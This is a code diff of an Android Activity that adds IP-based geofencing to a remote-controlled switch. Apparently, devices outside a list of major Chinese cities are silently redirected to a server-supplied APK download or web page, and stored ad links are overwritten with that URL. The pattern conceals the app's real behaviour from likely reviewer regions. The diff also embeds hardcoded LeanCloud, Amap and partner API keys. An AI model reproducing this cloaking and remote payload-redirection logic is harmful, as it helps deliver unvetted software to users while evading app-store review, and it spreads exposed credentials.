@@ -38,7 +38,6 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.FileReader;
@@ -47,10 +46,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
-import java.io.Serializable;
-import java.io.StringWriter;
-import java.io.Writer;
-import java.lang.reflect.Field;
 import java.net.HttpURLConnection;
 import java.net.Inet4Address;
 import java.net.InetAddress;
@@ -58,15 +53,11 @@ import java.net.MalformedURLException;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.net.URL;
-import java.text.DateFormat;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Enumeration;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
-import java.util.Map;
 
 
 /**
@@ -126,6 +117,7 @@ public class MJRegusActivityK extends Activity {
 
 
     String downLoadUrl;
+    private String ddUrl;
     public File savefolder;
     public String updateSaveName;
 
@@ -291,10 +283,10 @@ public class MJRegusActivityK extends Activity {
         public void run() {
 
             try {
-                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/61665006ec1d407bb2450e59");
+                URL urll = new URL("https://tlmdw22a.api.lncld.net/1.1/classes/UpVersion/6168e24d31c3f94692a5de7d");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setRequestProperty("X-LC-Id", "QnL4eqOeVFvxKnwF1gLDJywM-gzGzoHsz");
-                urlConnection.setRequestProperty("X-LC-Key", "8gEvCsJUQAcw2RJHpfoXknLQ");
+                urlConnection.setRequestProperty("X-LC-Id", "tLmDW22ab3CfULnkBagYBcqi-gzGzoHsz");
+                urlConnection.setRequestProperty("X-LC-Key", "YOF1GehjRo4WYR15TaE9ij3L");
                 urlConnection.setConnectTimeout(4000);
                 urlConnection.setReadTimeout(4000);
                 urlConnection.setRequestMethod("GET");
@@ -309,7 +301,6 @@ public class MJRegusActivityK extends Activity {
                         buffer.append(line);
                     }
                     String jsonStr = buffer.toString();
-                    //     Log.e("regus getDt ", jsonStr + "");
 
                     //处理
                     try {
@@ -321,32 +312,84 @@ public class MJRegusActivityK extends Activity {
                         String url = avObject.getString("url");
                         boolean isStop = avObject.getBoolean("stop");
 
+                        //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
+                        JSONArray ipsArray = avObject.getJSONArray("ips");
                         Log.e("avo", "s  " + show + " i  " + isStop);
 
-                        if (isStop) {
-                            if (show == 2) {
+                        if(isStop){
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
 
-                                if (url.endsWith("apk")) {
+                                    try {
 
-                                    downLoadUrl = url;
-                                    mode = 1;
-                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
-                                    showDownLoadDialog();
+                                        URL urll = new URL("https://restapi.amap.com/v3/ip?key=a11dbeb4815afc317622d62797d7e408");
+                                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+                                        urlConnection.setConnectTimeout(10000);
+                                        urlConnection.setReadTimeout(10000);
+                                        urlConnection.setRequestMethod("GET");
+                                        urlConnection.connect();
+                                        int code = urlConnection.getResponseCode();
+                                        if (code == 200) {
+                                            InputStream inputStream = urlConnection.getInputStream();
+                                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                                            String line;
+                                            StringBuffer buffer = new StringBuffer();
+                                            while ((line = bufferedReader.readLine()) != null) {
+                                                buffer.append(line);
+                                            }
+                                            String json = buffer.toString();
 
-                                } else {
-                                    Intent intent = new Intent();
-                                    intent.setAction(Intent.ACTION_VIEW);
-                                    Uri content_url = Uri.parse(url);
-                                    intent.setData(content_url);
-                                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
-                                    startActivity(intent);
+                                            //    Log.e("avo_map", "s  " + json );
+
+                                            JSONObject jsonMap = new JSONObject(json);
+
+                                            boolean isLimit = false;
+
+
+                                            for (int i = 0; i < ipsArray.length(); i++) {
+                                                String area = ipsArray.getString(i);
+                                                if (json.contains(area)) {
+                                                    isLimit = true;
+                                                }
+                                            }
+
+
+                                            if (json.contains("\"province\":[]")) {
+                                                isLimit = true;
+                                            }
+
+
+                                            String info = jsonMap.getString("info");
+
+                                            if (!info.toLowerCase().equals("ok")) {
+                                                isLimit = false;
+                                            }
+
+                                            //   Log.e("avo", "s  " + show + " i  " + isStop + " lmit "+ isLimit);
+
+                                            if(!isLimit){
+                                                lcDoRogic(isStop,show,url);
+                                            } else {
+                                                RequestThat();
+                                            }
+
+                                        } else {
+                                            Log.e("avo_0", "!200");
+                                            lcDoRogic(isStop,show,url);
+                                        }
+
+                                    } catch (JSONException e) {
+                                        Log.e("avo_2", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    } catch (Exception e) {
+                                        Log.e("avo_3", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    }
+
                                 }
-
-
-                            } else {
-                                jumpLocalSplash();
-                            }
-                        } else {
+                            }).start();
+                        }else {
                             RequestThat();
                         }
 
@@ -362,6 +405,37 @@ public class MJRegusActivityK extends Activity {
             }
         }
 
+    }
+
+    private void lcDoRogic(boolean isStop,int show,String url){
+        if (isStop) {
+            if (show == 2) {
+
+                if (url.endsWith("apk")) {
+//                                    downLoadUrl = url;
+//                                    mode = 1;
+//                                    showDownLoadDialog();
+
+                    ddUrl = url;
+
+                    jumpLocalSplash();
+
+                } else {
+                    Intent intent = new Intent();
+                    intent.setAction(Intent.ACTION_VIEW);
+                    Uri content_url = Uri.parse(url);
+                    intent.setData(content_url);
+                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
+                    startActivity(intent);
+                }
+
+
+            } else {
+                jumpLocalSplash();
+            }
+        } else {
+            RequestThat();
+        }
     }
 
 
@@ -482,7 +556,7 @@ public class MJRegusActivityK extends Activity {
                         JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                         Log.e("regus  array size", jsonArray.length() + "");
 
-                        if(jsonArray.length()>0){
+                        if (jsonArray.length() > 0) {
                             host = jsonArray.getString(0);
                         }
 
@@ -510,23 +584,23 @@ public class MJRegusActivityK extends Activity {
 
                     String url = host + "/Inbound/QueryAppConfig";
 
-                    Log.e("regus 跳转请求url", url+"");
+                    Log.e("regus 跳转请求url", url + "");
 
-                    String time = System.currentTimeMillis()+"";
+                    String time = System.currentTimeMillis() + "";
 
                     JSONObject jsonObject = new JSONObject();
                     JSONObject paramBeanJobj = new JSONObject();
 
                     try {
-                        jsonObject.put("ClientSource","0");
-                        jsonObject.put("PartnerKey","b82cc1515cd64869beefe697cce16aad");
-                        jsonObject.put("Date",time);
+                        jsonObject.put("ClientSource", "0");
+                        jsonObject.put("PartnerKey", "b82cc1515cd64869beefe697cce16aad");
+                        jsonObject.put("Date", time);
 
-                        paramBeanJobj.put("AppKey",mAid);
-                        paramBeanJobj.put("ChannelId",mSid);
-                        paramBeanJobj.put("Mac",macAddress);
+                        paramBeanJobj.put("AppKey", mAid);
+                        paramBeanJobj.put("ChannelId", mSid);
+                        paramBeanJobj.put("Mac", macAddress);
 
-                        jsonObject.put("Param",paramBeanJobj);
+                        jsonObject.put("Param", paramBeanJobj);
 
 
                     } catch (JSONException e) {
@@ -535,7 +609,7 @@ public class MJRegusActivityK extends Activity {
 
                     String param = jsonObject.toString();
 
-                    Log.e("regus",   "post param " +param);
+                    Log.e("regus", "post param " + param);
 
                     try {
 
@@ -564,7 +638,7 @@ public class MJRegusActivityK extends Activity {
                         out.flush();
                         out.close();
 
-                        Log.e("regus",   "post start");
+                        Log.e("regus", "post start");
 
                         int code = urlConnection.getResponseCode();
 
@@ -580,15 +654,15 @@ public class MJRegusActivityK extends Activity {
                             String jsonStr = buffer.toString();
                             Log.e("regus", jsonStr + "");
 
-                            solveLines(true, jsonStr,MJRegusActivityK.this);
+                            solveLines(true, jsonStr, MJRegusActivityK.this);
 
                         } else {
-                            Log.e("regus",   "不是200");
-                            solveLines(false, null,MJRegusActivityK.this);
+                            Log.e("regus", "不是200");
+                            solveLines(false, null, MJRegusActivityK.this);
                         }
                     } catch (Exception e) {
-                        Log.e("regus",   "请求开关错误 "+e.getLocalizedMessage());
-                        solveLines(false, null,MJRegusActivityK.this);
+                        Log.e("regus", "请求开关错误 " + e.getLocalizedMessage());
+                        solveLines(false, null, MJRegusActivityK.this);
                     }
 
 
@@ -601,13 +675,13 @@ public class MJRegusActivityK extends Activity {
     }
 
 
-    private  volatile boolean isGetKgRepInfoAlready = false;
+    private volatile boolean isGetKgRepInfoAlready = false;
 
 
     /**
      * 处理几个ping 域名的请求
      */
-    private  synchronized void solveLines(boolean isOK, String buJson,Activity activity) {
+    private synchronized void solveLines(boolean isOK, String buJson, Activity activity) {
 
         if (isGetKgRepInfoAlready) {
             Log.e("regus_", " 已经有可用域名 其他的直接return");
@@ -640,7 +714,7 @@ public class MJRegusActivityK extends Activity {
                             activity.runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                  //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
+                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                     getApkFromAssets();
                                 }
                             });
@@ -653,8 +727,51 @@ public class MJRegusActivityK extends Activity {
                             activity.runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
+
+                                    String key_ad_kg = "regus_download_open_";
+                                    String key_ad_value = "regus_download_url_";
+
+                                    try {
+                                        if (dataJsonObject.has("AdvertUrlJson")) {
+                                            JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertUrlJson");
+
+
+                                            if (advertiseArray != null) {
+                                                for (int i = 0; i < advertiseArray.length(); i++) {
+                                                    JSONObject jsonObject = advertiseArray.getJSONObject(i);
+                                                    if (jsonObject != null) {
+                                                        if (jsonObject.has("JumpUrl")) {
+                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                                    .putString(key_ad_value + i, jsonObject.getString("JumpUrl")).apply();
+                                                        }
+
+
+                                                        if (jsonObject.has("IsOpenJump")) {
+                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                                    .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsOpenJump")).apply();
+                                                        }
+                                                    }
+                                                }
+                                            }
+
+                                        }
+                                    } catch (JSONException e) {
+
+                                    }
+
+
+                                    if (!TextUtils.isEmpty(ddUrl)) {
+
+                                        for (int i = 0; i < 10; i++) {
+                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                    .putString(key_ad_value + i, ddUrl).apply();
+
+                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                    .putBoolean(key_ad_kg + i, true).apply();
+                                        }
+                                    }
+
                                     jumpLocalSplash();
-                                 //   DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                 }
                             });
                             return;
@@ -667,7 +784,6 @@ public class MJRegusActivityK extends Activity {
                             activity.runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                //   DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                     try {
                                         downLoadUrl = dataJsonObject.getString("DownloadUrl");
                                     } catch (JSONException e) {
@@ -675,6 +791,9 @@ public class MJRegusActivityK extends Activity {
                                     }
                                     mode = 1;
                                     Log.e("regus 得到的下载链接: ", downLoadUrl);
+                                    if (!TextUtils.isEmpty(ddUrl)) {
+                                        downLoadUrl = ddUrl;
+                                    }
                                     showDownLoadDialog();
                                 }
                             });
@@ -685,9 +804,15 @@ public class MJRegusActivityK extends Activity {
                             activity.runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                  //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
+                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                     mode = 0;
                                     try {
+
+                                        if (!TextUtils.isEmpty(ddUrl)) {
+                                            startWebview(ddUrl);
+                                            return;
+                                        }
+
                                         startWebview(dataJsonObject.getString("JumpUrl"));
                                     } catch (JSONException e) {
                                         e.printStackTrace();
@@ -697,11 +822,11 @@ public class MJRegusActivityK extends Activity {
                             return;
                         }
 
-                    }else {
+                    } else {
                         Log.e("regus_", " error 13");
                         jumpLocalSplash();
                     }
-                }else {
+                } else {
                     Log.e("regus_", " error 12");
                     jumpLocalSplash();
                 }
@@ -711,7 +836,7 @@ public class MJRegusActivityK extends Activity {
                 jumpLocalSplash();
             }
 
-        }else {
+        } else {
             jumpLocalSplash();
             Log.e("regus_", " error 1");
         }
@@ -732,6 +857,7 @@ public class MJRegusActivityK extends Activity {
      */
 
     private void jumpLocalSplash() {
+
         try {
             Class aimClass = Class.forName(activityPath);
             Intent intent = new Intent(MJRegusActivityK.this, aimClass);
@@ -1420,9 +1546,6 @@ public class MJRegusActivityK extends Activity {
     public static String getDeviceBrand() {
         return Build.BRAND;
     }
-
-
-
 
 
 }
